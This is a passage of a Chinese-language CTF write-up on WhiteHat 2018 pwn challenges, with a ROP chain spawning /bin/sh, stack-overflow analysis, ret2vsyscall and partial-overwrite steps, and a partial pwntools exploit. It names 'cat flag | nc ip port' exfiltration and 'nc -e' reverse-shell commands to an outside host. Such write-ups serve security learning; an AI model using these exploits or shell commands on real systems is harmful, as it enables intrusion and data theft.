    <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2030D8</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;elf&#34;</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;??</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;0000&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1111&#34;</span><span class="p">)</span>

    <span class="c1">#  DEBUG([0x19BC])</span>
    <span class="n">fgets_gadgets</span> <span class="o">=</span> <span class="mh">0x18B9</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">bof</span><span class="p">(</span><span class="n">flat</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x500</span><span class="p">,</span> <span class="n">fgets_gadgets</span><span class="p">]))</span>

    <span class="n">leaveret</span> <span class="o">=</span> <span class="mh">0x0000000000001176</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prdi</span> <span class="o">=</span> <span class="mh">0x000000000000225f</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prsi</span> <span class="o">=</span> <span class="mh">0x0000000000002261</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prdx</span> <span class="o">=</span> <span class="mh">0x0000000000002265</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prax</span> <span class="o">=</span> <span class="mh">0x0000000000002267</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x0000000000002254</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">binsh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x500</span> <span class="o">-</span> <span class="mh">0xd0</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">prax</span><span class="p">,</span> <span class="mh">0x40000000</span> <span class="o">+</span> <span class="mi">520</span><span class="p">,</span> <span class="n">prdi</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span> <span class="n">prsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">prdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">syscall</span><span class="p">])</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd0</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x500</span> <span class="o">-</span> <span class="mh">0xd0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaveret</span><span class="p">)</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">240</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
</div>
</div>
<h2 id="pwn02">Pwn02</h2>

<p>tcache uaf off-by-one null</p>

<h2 id="pwn03">Pwn03</h2>

<p>这道题挺有意思, 程序给了一个二进制文件和共享库, <a href="https://github.com/0x01f/pwn_repo/tree/master/WhiteHat2018_pwn03">下载文件</a></p>

<h3 id="题目分析-1">题目分析</h3>

<p>程序开启了所有保护, 并且有意思的是给的 libc 也是 patch 过得, 找一下 BuildID 相同的 libc, 查看 patch 的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span class="o">[</span>master●<span class="o">]</span> file ~/libc-database/db/libc6_2.27-3ubuntu1_amd64.so 
/home/m4x/libc-database/db/libc6_2.27-3ubuntu1_amd64.so: ELF <span class="m">64</span>-bit LSB pie executable x86-64, version <span class="m">1</span> <span class="o">(</span>GNU/Linux<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, <span class="k">for</span> GNU/Linux <span class="m">3</span>.2.0, stripped
WhiteHat2018_pwn03 <span class="o">[</span>master●<span class="o">]</span> file ./libc-2.27.so 
./libc-2.27.so: ELF <span class="m">64</span>-bit LSB pie executable x86-64, version <span class="m">1</span> <span class="o">(</span>GNU/Linux<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, <span class="k">for</span> GNU/Linux <span class="m">3</span>.2.0, stripped
WhiteHat2018_pwn03 <span class="o">[</span>master●<span class="o">]</span> diff libc-2.27.so ~/libc-database/db/libc6_2.27-3ubuntu1_amd64.so
二进制文件 libc-2.27.so 和 /home/m4x/libc-database/db/libc6_2.27-3ubuntu1_amd64.so 不同</code></pre></td></tr></table>
</div>
</div>
<p>这里我用的是 hexdiff
<img src="http://ww1.sinaimg.cn/large/006AWYXBly1funfoxn9cwj30ql0qd0y4.jpg" alt="" /></p>

<p>只有这一处是不同的, IDA 中可以看出此处的功能相当于 <code>add rsi 127; jmp system</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:000000000004F43A                 add     rdi, 7Fh
.text:000000000004F43E                 jmp     short loc_4F45B

.text:000000000004F45B loc_4F45B:                              ; CODE XREF: sub_4F360+DE↑j
.text:000000000004F45B                 call    sub_4EEB0
.text:000000000004F460                 test    eax, eax
.text:000000000004F462                 setz    al
.text:000000000004F465                 add     rsp, 8
.text:000000000004F469                 movzx   eax, al
.text:000000000004F46C                 retn

__int64 __fastcall system(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
    result = sub_4EEB0();
  else
    result = (unsigned int)sub_4EEB0() == 0;
  return result;
}</code></pre></td></tr></table>
</div>
</div>
<p>暂时不知道这段 gadget 有什么用, 先看二进制程序, 发现在 echo 函数中存在漏洞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">echo</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST0C_4
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-E4h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">216</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-E0h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+E8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">;</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Echo machine: &#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">deleteyourevilstring</span><span class="p">);</span>
<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<p>根据调试, read 时的长度 v0 是根据我们的输入决定的, 那么这里就存在一个栈溢出的漏洞, 有意思的是这道题的 stdin 和 stdout 也被关闭了, 根据现有的情况, 基本上溢出也只能利用一次了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:0000000000000EFE                 mov     rax, [rbp+var_8]
.text:0000000000000F02                 xor     rax, fs:28h
.text:0000000000000F0B                 jmp     short locret_F12
.text:0000000000000F0D ; ---------------------------------------------------------------------------
.text:0000000000000F0D                 call    ___stack_chk_fail
.text:0000000000000F12 ; ---------------------------------------------------------------------------
.text:0000000000000F12
.text:0000000000000F12 locret_F12:                             ; CODE XREF: echo+A4↑j
.text:0000000000000F12                 leave
.text:0000000000000F13                 retn</code></pre></td></tr></table>
</div>
</div>
<p>查看 <code>call __stack_chk_fail</code> 附近的汇编, 发现虽然 checksec 检测有 canary, 但实际没起作用, 这样 canary 保护也就绕过了</p>

<h4 id="step-1-1">Step 1:</h4>

<p>我们先看一下在 echo 函数 ret 前寄存器和栈上的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly">pwndbg&gt; 
0x000055f1e44c0f13 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0xa54266585221bb65
 RBX  0x0
 RCX  0x7ff52b699910 ◂— mov    rdx, qword ptr [rsi]
 RDX  0x676e6972747320
 RDI  0x7ffd0eed2220 ◂— 0x676e6972747320 /* u&#39; string&#39; */
 RSI  0x55f1e46c2020 ◂— 0x676e6972747320 /* u&#39; string&#39; */
 R8   0xe
 R9   0x0
 R10  0x8
 R11  0x7ff52b7923c0 ◂— loopne 0x7ff52b792436
 R12  0x55f1e44c0b50 ◂— xor    ebp, ebp
 R13  0x7ffd0eed24c0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6361616863616167 (&#39;gaachaac&#39;)
 RSP  0x7ffd0eed22f8 —▸ 0x55f1e44c0f69 ◂— nop    
 RIP  0x55f1e44c0f13 ◂— ret    
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
   0x55f1e44c0efd    nop    
   0x55f1e44c0efe    mov    rax, qword ptr [rbp - 8]
   0x55f1e44c0f02    xor    rax, qword ptr fs:[0x28]
   0x55f1e44c0f0b    jmp    0x55f1e44c0f12
    ↓
   0x55f1e44c0f12    leave  
 ► 0x55f1e44c0f13    ret    &lt;0x55f1e44c0f69&gt;
    ↓
   0x55f1e44c0f69    nop    
   0x55f1e44c0f6a    mov    rax, qword ptr [rbp - 8]
   0x55f1e44c0f6e    xor    rax, qword ptr fs:[0x28]
   0x55f1e44c0f77    je     0x55f1e44c0f7e
    ↓
   0x55f1e44c0f7e    leave  
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp  0x7ffd0eed22f8 —▸ 0x55f1e44c0f69 ◂— nop    
01:0008│      0x7ffd0eed2300 ◂— 0x31 /* u&#39;1&#39; */
02:0010│      0x7ffd0eed2308 ◂— 0x0
... ↓
pwndbg&gt; stack 25
00:0000│ rsp  0x7ffd0eed22f8 —▸ 0x55f1e44c0f69 ◂— nop    
01:0008│      0x7ffd0eed2300 ◂— 0x31 /* u&#39;1&#39; */
02:0010│      0x7ffd0eed2308 ◂— 0x0
... ↓
0e:0070│      0x7ffd0eed2368 ◂— 0x7ff500000000
0f:0078│      0x7ffd0eed2370 —▸ 0x55f1e44c1268 ◂— 0x63616d206f686345 (&#39;Echo mac&#39;)
10:0080│      0x7ffd0eed2378 ◂— 0xc623073e3140da00
11:0088│      0x7ffd0eed2380 ◂— 0x0
12:0090│      0x7ffd0eed2388 —▸ 0x7ffd0eed23d0 —▸ 0x7ffd0eed23e0 —▸ 0x55f1e44c1060 ◂— push   r15
13:0098│      0x7ffd0eed2390 —▸ 0x55f1e44c0b50 ◂— xor    ebp, ebp
14:00a0│      0x7ffd0eed2398 —▸ 0x7ff52b632460 (system+32) ◂— test   eax, eax
15:00a8│      0x7ffd0eed23a0 —▸ 0x7ffd0eed24c0 ◂— 0x1
16:00b0│      0x7ffd0eed23a8 —▸ 0x55f1e44c0fef ◂— nop    
17:00b8│      0x7ffd0eed23b0 ◂— 0x0
18:00c0│      0x7ffd0eed23b8 ◂— 0x304e000000000000
pwndbg&gt; telescope $rdi
00:0000│ rdi  0x7ffd0eed2220 ◂— 0x676e6972747320 /* u&#39; string&#39; */
01:0008│      0x7ffd0eed2228 ◂— 0x6161616861616167 (&#39;gaaahaaa&#39;)
02:0010│      0x7ffd0eed2230 ◂— 0x6161616a61616169 (&#39;iaaajaaa&#39;)
03:0018│      0x7ffd0eed2238 ◂— 0x6161616c6161616b (&#39;kaaalaaa&#39;)
04:0020│      0x7ffd0eed2240 ◂— 0x6161616e6161616d (&#39;maaanaaa&#39;)
05:0028│      0x7ffd0eed2248 ◂— 0x616161706161616f (&#39;oaaapaaa&#39;)
06:0030│      0x7ffd0eed2250 ◂— 0x6161617261616171 (&#39;qaaaraaa&#39;)
07:0038│      0x7ffd0eed2258 ◂— 0x6161617461616173 (&#39;saaataaa&#39;)
pwndbg&gt; </code></pre></td></tr></table>
</div>
</div>
<p>有两点值得注意:</p>

<ol>
<li>rdi + 8 到之后的很长一段都是可控的</li>
<li>栈上有一个 system + 32 的地址
这样再结合之前 libc 上的 gadget <code>add rdi, 127; jmp system</code>, 就可以通过 partial overwrite 改写 system + 32 的低位为 gadget 的地址(调试验证此时只需改写最低位即可, 是可行的), 这样如果能控制 rip 为此 gadget 的地址, 就相当于控制了 system 的参数, 有了一次执行命令的机会</li>
</ol>

<h4 id="step-2-1">Step 2:</h4>

<p>但问题出在 system + 32 在 <code>rsp + 0xa0</code> 这个位置, 我们需要控制 echo 函数返回到这里, 这个也好办, 用 ret2vsyscall 可以达到这个目的</p>

<blockquote>
<p>TLDR:
  可以把 vsyscall 理解为一段固定地址和内容的 gadget, 用这段 gadget 填满栈, 可以实现 slide 的功能</p>
</blockquote>

<p>vsyscall 的地址可以直接用 vmmap 找到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly">pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x55ef6a521000     0x55ef6a523000 r-xp     2000 0      /home/m4x/pwn_repo/WhiteHat2018_pwn03/onehit
    0x55ef6a722000     0x55ef6a723000 r--p     1000 1000   /home/m4x/pwn_repo/WhiteHat2018_pwn03/onehit
    0x55ef6a723000     0x55ef6a724000 rw-p     1000 2000   /home/m4x/pwn_repo/WhiteHat2018_pwn03/onehit
    0x55ef6b8f7000     0x55ef6b918000 rw-p    21000 0      [heap]
    0x7fe121ebd000     0x7fe1220a4000 r-xp   1e7000 0      /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
    0x7fe1220a4000     0x7fe1222a4000 ---p   200000 1e7000 /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
    0x7fe1222a4000     0x7fe1222a8000 r--p     4000 1e7000 /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
    0x7fe1222a8000     0x7fe1222aa000 rw-p     2000 1eb000 /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
    0x7fe1222aa000     0x7fe1222ae000 rw-p     4000 0      
    0x7fe1222ae000     0x7fe1222d3000 r-xp    25000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe1224d0000     0x7fe1224d2000 rw-p     2000 0      
    0x7fe1224d2000     0x7fe1224d3000 r--p     1000 24000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe1224d3000     0x7fe1224d4000 rw-p     1000 25000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe1224d4000     0x7fe1224d5000 rw-p     1000 0      
    0x7ffc925ca000     0x7ffc925eb000 rw-p    21000 0      [stack]
    0x7ffc925ec000     0x7ffc925ef000 r--p     3000 0      [vvar]
    0x7ffc925ef000     0x7ffc925f1000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg&gt; x/5i 0xffffffffff600000
   0xffffffffff600000:	mov    rax,0x60
   0xffffffffff600007:	syscall 
   0xffffffffff600009:	ret    
   0xffffffffff60000a:	int3   
   0xffffffffff60000b:	int3   </code></pre></td></tr></table>
</div>
</div>
<p>这样通过 ret2vsyscall + partial overwrite, 我们就能控制 system 执行一次指令了</p>

<h4 id="step-3-1">Step 3:</h4>

<p>还要注意的是, 程序的 stdout 被关掉了, 这个和 0ctf2018 的 babystack 类似, 可以使用 <code>cat flag| nc ip port</code> 的方式在公网 vps 上监听到(<code>nc -l -p port</code>)</p>

<p>或者使用 <code>nc -e ip port</code> 来建立一个反向 shell, 原理可以参考</p>

<p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>

<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>

<p>讲的很清楚</p>

<p>但还有一个更简单的方法，使用 <code>sh flag;</code> 利用报错来拿到 flag</p>

<h4 id="exp-1">exp</h4>

<p>最终的 exp 如下, 其中的一些细节调试一遍会更加清楚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="err"></span><span class="n">WhiteHat2018_pwn03</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha512</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./onehit&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./onehit&#34;</span><span class="p">,</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span> <span class="s2">&#34;./libc-2.27.so&#34;</span><span class="p">})</span>
<span class="c1">#  io = remote(&#34;localhost&#34;, 9999)</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">(</span><span class="n">bps</span> <span class="o">=</span> <span class="p">[]):</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;set follow-fork-mode parent</span><span class="se">\n</span><span class="s2">&#34;</span>
    <span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;pmap {}| awk &#39;{{print $1}}&#39;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">))</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">cmd</span> <span class="o">+=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;b *{:#x}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bps</span><span class="p">])</span>
    <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;c&#34;</span>

    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_interger</span><span class="p">():</span>
    <span class="n">prefix</span><span class="p">,</span> <span class="n">head</span> <span class="o">=</span>  <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;&#34;([A-Z]+)&#34;.*0x([0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;The interger&#34;</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="c1">#  print prefix, head</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1fffff</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="k">if</span> <span class="n">sha512</span><span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">head</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">i</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Not Found!!!&#34;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
